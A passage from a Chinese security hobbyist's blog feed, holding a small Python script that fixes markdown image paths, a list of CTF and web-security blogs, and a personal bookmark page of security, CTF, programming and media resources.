punctuation">)</span>    <span class="token keyword">if</span> file<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'md'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>filePath<span class="token punctuation">,</span>file<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>            old <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            new_text<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"!\\[[\\u4e00-\\u9fa5a-zA-Z0-9 \\-]*\\]\\([\\u4e00-\\u9fa5a-zA-Z0-9 \\-]*/"</span><span class="token punctuation">,</span><span class="token string">"![]("</span><span class="token punctuation">,</span>old<span class="token punctuation">)</span>            new_text1<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"src=\"[\\u4e00-\\u9fa5a-zA-Z\\-1-9 ]*/"</span><span class="token punctuation">,</span><span class="token string">"src=\""</span><span class="token punctuation">,</span>new_text<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(new_text1)</span>            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>truncate<span class="token punctuation">(</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_text1<span class="token punctuation">)</span>        count<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span></code></pre><h3 id="改之前记得备份！！！！"><a href="#改之前记得备份！！！！" class="headerlink" title="改之前记得备份！！！！"></a>改之前记得备份！！！！</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web师傅们的博客收集</title>
      <link href="/2019/11/19/web-shi-fu-men-de-bo-ke-shou-ji/"/>
      <url>/2019/11/19/web-shi-fu-men-de-bo-ke-shou-ji/</url>
      
        <content type="html"><![CDATA[<p><a href="https://huai.pub/" target="_blank" rel="noopener">坏男孩</a></p><p><a href="https://skysec.top/" target="_blank" rel="noopener">Sky’s blog</a></p><p><a href="https://zhzhdoai.github.io/tags/CTF/" target="_blank" rel="noopener">PaperTiger’s blog</a></p><p><a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/#toc-heading-17" target="_blank" rel="noopener">BUUCTF的wp(随时弃坑) | Mrkaixin自留地</a></p><p><a href="https://xz.aliyun.com/t/3085" target="_blank" rel="noopener">ctf中常见的PHP漏洞小结 - 先知社区</a></p><p><a href="https://yinwc.github.io/2018/09/28/Dmsj/" target="_blank" rel="noopener">代码审计练习 · Ywc’s blog</a></p><p><a href="https://www.zhaoj.in/" target="_blank" rel="noopener">赵 – 为心中的美好而战</a></p><p><a href="https://blog.csdn.net/stepone4ward/article/details/100088959" target="_blank" rel="noopener">SUCTF2019 web部分赛题复盘 - stepone4ward的博客 - CSDN博客</a></p><p><a href="https://x1ct34m.github.io/" target="_blank" rel="noopener">X1cT34m’s BLOG |</a></p><p><a href="http://momomoxiaoxi.com/" target="_blank" rel="noopener">小西的博客 | Xiaoxi’s Blog</a></p><p><a href="https://r3kapig.com/" target="_blank" rel="noopener">r3kapig | United Team of Eur3kA and FlappyPig</a></p><p><a href="https://changochen.github.io/about.html" target="_blank" rel="noopener">Yongheng Chen (Ne0) | Good defense requires a detailed knowledge of offense.</a></p><p><a href="https://blog.rois.io/" target="_blank" rel="noopener">ROIS Blog - Hack for fun</a></p><p><a href="https://www.attacker.cc/" target="_blank" rel="noopener">云袭2001’s blog</a></p><p><a href="https://xiaodaozhi.com/" target="_blank" rel="noopener">小刀志</a></p><p><a href="https://j00ru.vexillium.org/" target="_blank" rel="noopener">j00ru//vx tech blog</a></p><p><a href="https://improsec.com/tech-blog?author=5c0d78274ae237a297e3f992" target="_blank" rel="noopener">TECH BLOG — Improsec | improving security</a></p><p><a href="http://www.alex-ionescu.com/" target="_blank" rel="noopener">Alex Ionescu’s Blog – Windows Internals, Thoughts on Security, and Reverse Engineering</a></p><p><a href="https://susers.github.io/" target="_blank" rel="noopener">SUS</a></p><p><a href="https://www.seebug.org/appdir/CmsEasy" target="_blank" rel="noopener">Vulnerability Component - CmsEasy - Knownsec Seebug Vulnerability Platform</a></p><p><a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">2019UNCTF · CTF Writeup</a></p><p><a href="https://4o4notfound.org/" target="_blank" rel="noopener">404 Not Found</a></p><p><a href="https://www.leavesongs.com/" target="_blank" rel="noopener">首页 | 离别歌</a></p><p><a href="http://pupiles.com/" target="_blank" rel="noopener">Pupiles blog</a></p><p><a href="https://www.k0rz3n.com/" target="_blank" rel="noopener">K0rz3n’s Blog | Shell-is-Only-the-Beginning</a></p><p><a href="http://blog.lnyas.xyz/" target="_blank" rel="noopener">Lnyassss – 太阳太阳给我们带来七色光彩</a></p><p><a href="https://www.zuozuovera.com/links.html" target="_blank" rel="noopener">Links - 薇拉航线</a></p><p><a href="https://www.cdxy.me/" target="_blank" rel="noopener">Home - cdxy</a></p><p><a href="http://www.louys.net.cn/" target="_blank" rel="noopener">louys-代码审计入门中</a></p><p><a href="https://www.xmsec.cc/" target="_blank" rel="noopener">Blog | xmsec - 陌小生</a></p><p><a href="https://www.1aq.com/about.html" target="_blank" rel="noopener">关于我们 - 网络尖刀（1AQ TEAM）团队1aq.com</a></p><p><a href="https://www.virzz.com/" target="_blank" rel="noopener">Index - Virink’s Blog</a></p><p><a href="http://blog.neargle.com/" target="_blank" rel="noopener">Nearg1e - Web Develop&amp;Security / 安全研究 / 漏洞挖掘 / 安全开发 / Pyer / Anime</a></p><p><a href="https://thief.one/" target="_blank" rel="noopener">nmask’s Blog - 风陵渡口</a></p><p><a href="http://maya66.net.cn/" target="_blank" rel="noopener">江水</a></p><p><a href="https://tom0li.github.io/" target="_blank" rel="noopener">tom0li – Web sec RFID pentest Researcher</a></p><p><a href="https://www.hackingarticles.in/ctf-challenges-walkthrough/" target="_blank" rel="noopener">CTF挑战-黑客文章</a></p><p><a href="https://byqiyou.github.io/#indexCard" target="_blank" rel="noopener">七友’s Blog</a></p><p><a href="https://www.bertramc.cn/about.html" target="_blank" rel="noopener">关于 | berTrAM’s Blog</a></p><p><a href="http://hurricane618.me/" target="_blank" rel="noopener">风之栖息地|hurricane618’s blog</a></p><p><a href="https://2kb.me/" target="_blank" rel="noopener">2kb.ME | 两颗币</a></p><p><a href="http://www.northity.com/" target="_blank" rel="noopener">N0rth3ty’s Blog</a></p><p><a href="http://p0desta.com/about/" target="_blank" rel="noopener">About me | p0desta’s blog | WEB安全、代码审计、安全开发、20届毕业本科生</a></p><p><a href="http://www.webbaozi.com/" target="_blank" rel="noopener">baozi’s Blog | 我还想再试一次</a></p><p><a href="https://www.lorexxar.cn/" target="_blank" rel="noopener">LoRexxar’s Blog</a></p><p><a href="http://atum.li/" target="_blank" rel="noopener">Atum</a></p><p><a href="https://bestwing.me/" target="_blank" rel="noopener">Swing’Blog 有恨无人省</a></p><p><a href="http://f1sh.site/" target="_blank" rel="noopener">Blog of f1sh – Try Hard.</a></p><p><a href="https://www.jgeek.cn/other" target="_blank" rel="noopener">0x584A</a></p><p><a href="https://m3lon.github.io/" target="_blank" rel="noopener">m3lon</a></p><p><a href="https://www.jgeek.cn/" target="_blank" rel="noopener">0x584A</a></p><p><a href="https://darkeyer.github.io/" target="_blank" rel="noopener">Mr.R的博客 | By Blog</a></p><p><a href="https://www.sqlsec.com/" target="_blank" rel="noopener">国光</a></p><p><a href="http://cauc.me/about/" target="_blank" rel="noopener">about | Yiruma</a></p><p><a href="https://seaii-blog.com/" target="_blank" rel="noopener">Seaii’s Blog</a></p><p><a href="http://p0desta.com/" target="_blank" rel="noopener">p0desta’s blog | WEB安全、代码审计、安全开发、20届毕业本科生</a></p><p><a href="https://daolgts.github.io/" target="_blank" rel="noopener">道萝岗特森’s Blog</a></p><p><a href="http://v0w.top/" target="_blank" rel="noopener">V0W’s Blog</a></p><p><a href="https://evi0s.com/" target="_blank" rel="noopener">evi0s’ Blog - path of heart &amp; passion for code</a></p><p><a href="http://homura.cc/blog/" target="_blank" rel="noopener">Homura’s Blog</a></p><p><a href="http://mozhucy.cn/" target="_blank" rel="noopener">MozhuCY’s blog</a></p><p><a href="https://meizjm3i.github.io/" target="_blank" rel="noopener">梅子酒の笔记本 ]</a></p><p><a href="http://blog.5am3.com/" target="_blank" rel="noopener">丶诺熙丨5am3</a></p><p><a href="https://blog.sari3l.com/" target="_blank" rel="noopener">Learning Man</a></p><p><a href="https://p0sec.net/" target="_blank" rel="noopener">p0’s blog | 破 - 关注网络安全</a></p><p><a href="https://www.cnblogs.com/wfzWebSecuity/" target="_blank" rel="noopener">tr1ple - 博客园</a></p><p><a href="https://www.kkzevip.com/" target="_blank" rel="noopener">MoR03r’s Blog</a></p><p><a href="http://www.lovei.org/" target="_blank" rel="noopener">腹黑’s Blog</a></p><p><a href="http://www.ttk7.cn/" target="_blank" rel="noopener">天堂空气</a></p><p><a href="http://mang0.me/archis/f7c9beed/" target="_blank" rel="noopener">2018反思总结 | Mang0 的成长之路 | Mang0 | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</a></p><p><a href="http://ph0rse.me/" target="_blank" rel="noopener">Ph0rse’s Blog</a></p><p><a href="https://timeshu.github.io/archives/" target="_blank" rel="noopener">归档 | Time</a></p><p><a href="https://sherlocz.github.io/About_Me/" target="_blank" rel="noopener">渗透测试面试总结 | Sriracha :)</a></p><p><a href="https://www.smi1e.top/" target="_blank" rel="noopener">Smi1e |</a></p><p><a href="http://admintony.com/" target="_blank" rel="noopener">AdminTony’s Blog - 专注于渗透测试|信息安全|网络攻防对抗等领域</a></p><p><a href="https://www.codemonster.cn/" target="_blank" rel="noopener">打代码的怪兽 CodeMonster</a></p><p><a href="http://flag0.com/" target="_blank" rel="noopener">GetFlag’s Blog</a></p><p><a href="http://yulige.top/" target="_blank" rel="noopener">郁离歌丶的博客 – 远去的梦想与荣光。</a></p><p><a href="http://blog.thecosmos.cn/" target="_blank" rel="noopener">Cosmos‘s blog</a></p><p><a href="https://southseast.cc/" target="_blank" rel="noopener">境界的彼方</a></p><p><a href="https://greyd0g.github.io/" target="_blank" rel="noopener">greyd0g’ blog</a></p><p><a href="https://brucetg.github.io/" target="_blank" rel="noopener">Brucetg’s Blog</a></p><p><a href="https://hpdoger.cn/" target="_blank" rel="noopener">Hpdoger</a></p><p><a href="http://adm1n.design/" target="_blank" rel="noopener">Hu3sky’s blog</a></p><p><a href="https://www.kingkk.com/" target="_blank" rel="noopener">Kingkk’s Blog</a></p><p><a href="https://mochazz.github.io/archives/" target="_blank" rel="noopener">归档 | Mochazz’s blog</a></p><p><a href="https://love-sg.me/" target="_blank" rel="noopener">SG’s Blog</a></p><p><a href="http://yugod.xmutsec.com/" target="_blank" rel="noopener">yuf1sher’s blog</a></p><p><a href="https://www.addon.pub/" target="_blank" rel="noopener">Yokeen’s blog</a></p><p><a href="https://p0rz9.github.io/" target="_blank" rel="noopener">JAVA审计P0rZ9’s blog</a></p><p><a href="https://kctf.github.io/" target="_blank" rel="noopener">kn0ck’s blog | 一群CTF爱好者</a></p><p><a href="https://geeeez.github.io/" target="_blank" rel="noopener">geez博客</a></p><p><a href="https://www.hexlt.org/" target="_blank" rel="noopener">Hexman的自习室</a></p><p><a href="https://only-free.github.io/" target="_blank" rel="noopener">only_free blog</a></p><p><a href="https://www.hexlt.org/archives/120.html" target="_blank" rel="noopener">娱乐渗透某黑阔站 - Hexman的自习室</a></p><p><a href="https://marblue.me/" target="_blank" rel="noopener">Marblue’s World</a></p><p><a href="https://jayl1n.github.io/" target="_blank" rel="noopener">Jayl1n’s Blog</a></p><p><a href="https://rj45mp.github.io/" target="_blank" rel="noopener">Rj45’s blog</a></p><p><a href="https://altman.vip/" target="_blank" rel="noopener">Page 1 | Altm4nz</a></p><p><a href="https://evoa.me/" target="_blank" rel="noopener">evoA’s Blog - eval A</a></p><p><a href="https://www.virtua1.cn/#" target="_blank" rel="noopener">Virtua1の日常 - Hack for fun.Enjoy coding.</a></p><p><a href="https://github.red/" target="_blank" rel="noopener">Light Cube – 愿用自己的力量，为这个世界增添一份色彩。</a></p><p><a href="https://1oid.github.io/" target="_blank" rel="noopener">一步一世界</a></p><p><a href="https://blog.szfszf.top/" target="_blank" rel="noopener">JrXnm</a></p><p><a href="https://www.se7ensec.cn/" target="_blank" rel="noopener">Se7en’s Blog|Learn and live</a></p><p><a href="https://www.cnblogs.com/leixiao-" target="_blank" rel="noopener">淚笑 - 博客园</a></p><p><a href="https://wywwzjj.top/" target="_blank" rel="noopener">wywwzjj’s Blog</a></p><p><a href="https://xi4or0uji.github.io/" target="_blank" rel="noopener">Xi4or0uji</a></p><p><a href="https://boluochuixue.top/" target="_blank" rel="noopener">菠萝吹雪’s Studio</a></p><p><a href="https://blog.zeddyu.info/" target="_blank" rel="noopener">Zedd’s Blog</a></p><p><a href="https://250.ac.cn/" target="_blank" rel="noopener">惊蛰 | Let life be beautiful like summer flowers and death like autumn leaves.</a></p><p><a href="https://r1dd1er.top/" target="_blank" rel="noopener">R1dd1er’s blogs</a></p><p><a href="https://blog.cloudyu.me/" target="_blank" rel="noopener">云屿’s Blog</a></p><p><a href="https://tiaonmmn.github.io/" target="_blank" rel="noopener">Tiaonmmn’s Littile House</a></p><p><a href="http://song-of-icesnow.cn/" target="_blank" rel="noopener">Mr_Song – 我想要很多，我所知甚少。</a></p><p><a href="https://www.cnblogs.com/kagari/" target="_blank" rel="noopener">kagi| - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> 咪咪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人用的导航栏</title>
      <link href="/2019/11/19/ge-ren-yong-de-dao-hang-lan/"/>
      <url>/2019/11/19/ge-ren-yong-de-dao-hang-lan/</url>
      
        <content type="html"><![CDATA[<h3 id="安全资源平台"><a href="#安全资源平台" class="headerlink" title="安全资源平台"></a>安全资源平台</h3><p><a href="https://wiki.x10sec.org/" target="_blank" rel="noopener">CTFWiki</a><br><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知社区</a><br><a href="https://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News</a><br><a href="https://paper.seebug.org/744/" target="_blank" rel="noopener">paper.seebug</a><br><a href="https://www.freebuf.com/" target="_blank" rel="noopener">freebuf</a><br><a href="https://www.seebug.org/" target="_blank" rel="noopener">知道创宇洞悉漏洞</a><br><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全课</a><br><a href="https://skills.bugbank.cn/" target="_blank" rel="noopener">漏洞银行</a><br><a href="https://bbs.pediy.com/" target="_blank" rel="noopener">看雪论坛</a><br><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">看雪学院</a><br><a href="https://www.shentoushi.top/" target="_blank" rel="noopener">渗透师导航</a><br><a href="http://www.anquan.us/" target="_blank" rel="noopener">乌云镜像</a><br><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">国家信息安全漏洞库</a><br><a href="https://src.sjtu.edu.cn/" target="_blank" rel="noopener">教育行业漏洞报告平台</a><br><a href="http://0day5.com/" target="_blank" rel="noopener">0day5漏洞时代</a><br><a href="https://www.1aq.com/?sc=a" target="_blank" rel="noopener">网络尖刀</a></p><hr><h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><ul><li>Pwn<br><a href="http://pwnable.kr/" target="_blank" rel="noopener">http://pwnable.kr/</a><br><a href="https://pwnable.tw/challenge/" target="_blank" rel="noopener">https://pwnable.tw/challenge/</a><br><a href="https://github.com/bash-c/pwn_repo" target="_blank" rel="noopener">https://github.com/bash-c/pwn_repo</a></li><li>Web<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a><br><a href="https://github.com/CTFTraining/CTF_WEB_SOURCE" target="_blank" rel="noopener">https://github.com/CTFTraining/CTF_WEB_SOURCE</a><br><a href="https://github.com/hongriSec/Web-Security-Attack" target="_blank" rel="noopener">https://github.com/hongriSec/Web-Security-Attack</a><br><a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs</a><br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a><br><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></li><li>刷题平台<br><a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">i春秋竞赛训练营</a><br><a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a><br><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a><br><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></li><li>wp和复现<br><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">关于ThinkPHP框架的历史漏洞分析集合</a><br><a href="https://github.com/susers/Writeups" target="_blank" rel="noopener">https://github.com/susers/Writeups</a><br><a href="https://www.ctfwp.com/articals/all.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/all.html</a><br><a href="https://github.com/p4-team/ctf" target="_blank" rel="noopener">https://github.com/p4-team/ctf</a><br><a href="https://github.com/ctfs/write-ups-2017" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2017</a><br><a href="https://github.com/CTFTraining/CTFTraining" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining</a><br><a href="https://github.com/buptchk/webshell" target="_blank" rel="noopener">webshell收集项目</a><br><a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2019" target="_blank" rel="noopener">CTF比赛题目仓库-2019</a><br><a href="https://xz.aliyun.com/u/10394" target="_blank" rel="noopener">红日安全https://xz.aliyun.com/u/10394</a><br><a href="https://github.com/balsn/ctf_writeup" target="_blank" rel="noopener">https://github.com/balsn/ctf_writeup</a><br><a href="https://github.com/Kit4y/Sql-Injection" target="_blank" rel="noopener">sqlilabs-wp</a><br><a href="https://ctfbook.ph0en1x.com/" target="_blank" rel="noopener">https://ctfbook.ph0en1x.com/</a></li></ul><hr><h3 id="渗透学习的资料"><a href="#渗透学习的资料" class="headerlink" title="渗透学习的资料"></a>渗透学习的资料</h3><p><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/d靶场</a><br><a href="https://github.com/az0ne/Permeable" target="_blank" rel="noopener">https://github.com/az0ne/Permeable</a><br><a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes" target="_blank" rel="noopener">https://github.com/uknowsec/Active-Directory-Pentest-Notes</a><br><a href="https://github.com/coffeehb/Some-PoC-oR-ExP" target="_blank" rel="noopener">各种漏洞poc、Exp的收集或编写</a><br><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉资产-子域名，ip等信息收集</a><br><a href="https://www.t00ls.net/" target="_blank" rel="noopener">https://www.t00ls.net/</a><br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">从零开始内网渗透学习</a><br><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">子域名收集工具</a><br><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">cms指纹查询</a><br><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉cms指纹查询</a></p><h5 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h5><p><a href="https://www.seebug.org/appdir/CmsEasy" target="_blank" rel="noopener">知道创宇cms漏洞查询</a><br><a href="https://wiki.ioin.in/search?word=cmseasy" target="_blank" rel="noopener">sec_new_cms漏洞查询</a><br><a href="https://cxsecurity.com/issue/WLB-2018040046" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2018040046</a><br><a href="https://www.exploit-db.com/exploits/44405" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44405</a><br><a href="http://vulhub.org.cn/vulns/25?exploit=on&view=global" target="_blank" rel="noopener">http://vulhub.org.cn/vulns/25?exploit=on&amp;view=global</a></p><hr><h3 id="CTF工具"><a href="#CTF工具" class="headerlink" title="CTF工具"></a>CTF工具</h3><p><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">加解密工具大全</a><br><a href="https://pmd5.com/" target="_blank" rel="noopener">https://pmd5.com/Md5在线解密</a><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/Md5在线解密</a><br><a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">brainfuck</a><br><a href="https://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">jsfuck</a><br><a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">base16-32-64</a><br><a href="https://tool.bugku.com/safe/hash.php" target="_blank" rel="noopener">hash计算</a><br><a href="https://tool.bugku.com/whois/" target="_blank" rel="noopener">whois</a><br><a href="http://factordb.com/index.php" target="_blank" rel="noopener">大整数分解</a><br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a><br><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker（可恢复完整 Git 仓库）</a><br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a><br><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">.hg 文件恢复</a><br><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a><br><a href="https://github.com/admintony/svnExploit" target="_blank" rel="noopener">svnExploit</a><br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap</a><br><a href="https://github.com/guyoung/CaptfEncoder" target="_blank" rel="noopener">CaptfEncoder跨平台网络安全工具套件</a><br><a href="https://github.com/Kit4y/fuzzdb-and-tools" target="_blank" rel="noopener">一些常用的木马-文件上传题目的一些小工具</a><br><a href="https://3v4l.org/" target="_blank" rel="noopener">php在线在线运行各版本的php</a><br><a href="https://tool.lu/pyc/?utm_source=qdan.me" target="_blank" rel="noopener">pytho在线n反编译</a></p><hr><h3 id="程序员用工具"><a href="#程序员用工具" class="headerlink" title="程序员用工具"></a>程序员用工具</h3><p><a href="http://www.bejson.com/othertools/regex/" target="_blank" rel="noopener">在线正则</a><br><a href="http://www.jsons.cn/phpformat/" target="_blank" rel="noopener">代码格式工具</a><br><a href="http://tools.jb51.net/code/js" target="_blank" rel="noopener">js代码格式工具</a><br><a href="http://www.yishimei.cn/network/319.html" target="_blank" rel="noopener">KMS工具</a><br><a href="http://www.planetb.ca/syntax-highlight-word" target="_blank" rel="noopener">word文档中的代码高亮</a><br><a href="http://coolaf.com/tool/md" target="_blank" rel="noopener">在线markdown转word、pdf、html</a><br><a href="http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20" target="_blank" rel="noopener">生成banner</a><br><a href="https://crxdl.com/" target="_blank" rel="noopener">谷歌浏览器插件下载</a><br><a href="https://demo.codimd.org/" target="_blank" rel="noopener">共享面板https://demo.codimd.org/</a><br><a href="https://www.wondercv.com/cvs" target="_blank" rel="noopener">超级简历</a><br><a href="https://www.processon.com/" target="_blank" rel="noopener">在线制图</a><br><a href="https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads" target="_blank" rel="noopener">下载vc++</a><br><a href="https://code.y444.cn/" target="_blank" rel="noopener">代码在线运行https://code.y444.cn/</a></p><hr><h3 id="多媒体工具"><a href="#多媒体工具" class="headerlink" title="多媒体工具"></a>多媒体工具</h3><p><a href="https://www.aconvert.com/cn/audio/" target="_blank" rel="noopener">在线多媒体格式转换</a><br><a href="https://cli.im/" target="_blank" rel="noopener">生成二维码</a><br><a href="https://www.enterdesk.com/" target="_blank" rel="noopener">回车桌面高清壁纸</a><br><a href="http://desk.zol.com.cn/" target="_blank" rel="noopener">桌面壁纸</a><br><a href="https://www.zdqx.com/" target="_blank" rel="noopener">精品壁纸</a><br><a href="https://v.pnote.net/" target="_blank" rel="noopener">获得视频的每一帧</a><br><a href="http://www.ypppt.com/" target="_blank" rel="noopener">免费的ppt模板</a><br><a href="http://www.jiniannet.com/Page/allcolor" target="_blank" rel="noopener">在线从图片中颜色提取</a><br><a href="http://xiaohudie.net/RGB.html" target="_blank" rel="noopener">rgb取色</a><br><a href="http://q1.qlogo.cn/g?b=qq&nk=381382770&s=640" target="_blank" rel="noopener">获得qq头像</a><br><a href="https://www.jinrishici.com/#" target="_blank" rel="noopener">每日一句诗</a><br><a href="https://shici.store/huajianji/www/list/%E5%AE%8B%E8%AF%8D%E4%B8%89%E7%99%BE%E9%A6%96.html" target="_blank" rel="noopener">宋词三百首</a><br><a href="https://crashcourse.club/category/" target="_blank" rel="noopener">精品翻译课程</a><br><a href="https://github.com/yunweb/cool" target="_blank" rel="noopener">互联网上收集的各种炫酷特效源码</a><br><a href="https://gosubtitle.com/" target="_blank" rel="noopener">视频添加字幕</a></p><hr><h3 id="一些文档教程"><a href="#一些文档教程" class="headerlink" title="一些文档教程"></a>一些文档教程</h3><p><a href="https://www.runoob.com/" target="_blank" rel="noopener">菜鸟教程</a><br><a href="https://mybatis.org/mybatis-3/zh/index.html" target="_blank" rel="noopener">mybatis官方教程</a><br><a href="https://accp.site/categories/%E7%BC%96%E7%A8%8B/Java/SpringBoot/" target="_blank" rel="noopener">springboot教程-非官方</a><br><a href="https://spring.io/projects/spring-framework" target="_blank" rel="noopener">spring官方教程</a><br><a href="https://docs.djangoproject.com/zh-hans/2.2/" target="_blank" rel="noopener">django中文文档</a><br><a href="https://dormousehole.readthedocs.io/en/latest/quickstart.html#id2" target="_blank" rel="noopener">flask中文文档</a><br><a href="https://cli.vuejs.org/zh/guide/" target="_blank" rel="noopener">vue-cli官方教程</a><br><a href="https://github.com/PanJiaChen/vue-admin-template" target="_blank" rel="noopener">vue-admin仓库</a></p><hr><h3 id="一些有趣的笔记"><a href="#一些有趣的笔记" class="headerlink" title="一些有趣的笔记"></a>一些有趣的笔记</h3><p><a href="https://github.com/ZXZxin/ZXBlog" target="_blank" rel="noopener">记录各种学习笔记(算法、Java、数据库、并发……)</a><br><a href="https://github.com/0voice/interview_internal_reference" target="_blank" rel="noopener">2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目</a><br><a href="https://github.com/Leezj9671/Pentest_Interview" target="_blank" rel="noopener">个人准备渗透测试和安全面试的经验之谈</a><br><a href="https://github.com/Dollarsss/sec-interview" target="_blank" rel="noopener">信息安全面试题汇总</a><br><a href="https://github.com/zhaoweiho/web-sec-interview/blob/master/README_CN.md" target="_blank" rel="noopener">信息安全行业从业者(Web安全/渗透测试方向)面试题目</a><br><a href="https://github.com/404notf0und/My-Security-Algorithm-Architecture" target="_blank" rel="noopener">404 Not Found的安全算法知识体系</a><br><a href="https://github.com/FeeiCN/SecurityInterviewQuestions" target="_blank" rel="noopener">网络信息安全从业者面试指南</a></p><hr><h3 id="一些有趣的东西"><a href="#一些有趣的东西" class="headerlink" title="一些有趣的东西"></a>一些有趣的东西</h3><p><a href="https://ftp.a2os.club/" target="_blank" rel="noopener">a20s网盘</a><br><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">脑图收集</a><br><a href="https://github.com/it-ebooks/it-ebooks-archive/blob/master/2018.md" target="_blank" rel="noopener">电子书下载</a><br><a href="https://github.com/404notf0und/Security-Data-Analysis-and-Visualization" target="_blank" rel="noopener">2018-2020青年安全圈-活跃技术博主/博客</a><br><a href="https://github.com/Kit4y/HtmlPageToMarkDown" target="_blank" rel="noopener">网页转成markdown</a><br><a href="https://github.com/riusksk/secbook/blob/master/README.md" target="_blank" rel="noopener">信息安全从业者书单推荐</a><br><a href="https://github.com/Kit4y/BookCorner" target="_blank" rel="noopener">nuaa-BookCorner</a><br><a href="https://github.com/haoel/leetcode" target="_blank" rel="noopener">leetcode示例</a><br><a href="https://github.com/shuoGG1239/Image2Text" target="_blank" rel="noopener">截屏获得文字内容</a></p>]]></content>
      
      
      <categories>
          
          <category> 导航栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 导航栏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成长的路上,偶尔缅怀过往,从不沉溺于悲伤</title>
      <link href="/2019/11/19/cheng-chang-de-lu-shang-ou-er-mian-huai-guo-wang-cong-bu-chen-ni-yu-bei-shang/"/>
      <url>/2019/11/19/cheng-chang-de-lu-shang-ou-er-mian-huai-guo-wang-cong-bu-chen-ni-yu-bei-shang/</url>
      
